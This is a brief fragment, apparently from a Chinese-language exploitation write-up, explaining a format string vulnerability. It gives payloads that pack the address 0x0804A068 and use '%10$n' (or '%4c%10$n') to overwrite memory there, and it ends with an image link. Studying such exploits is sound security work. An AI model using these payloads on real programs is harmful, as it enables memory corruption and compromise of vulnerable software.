...
因此，我们可以构造出我们这次格式化漏洞的攻击代码：`u32(0x0804A068) + aaaa%10$n`
...
这里除了 `u32(0x0804A068) + aaaa%10$n` 这种形式我们也可以使用 `u32(0x0804A068) + '%4c%10$n` 能同样的达到效果
...
![](\https://imlonghao.com/files/55/20191102225516748_19214.png =1200x)
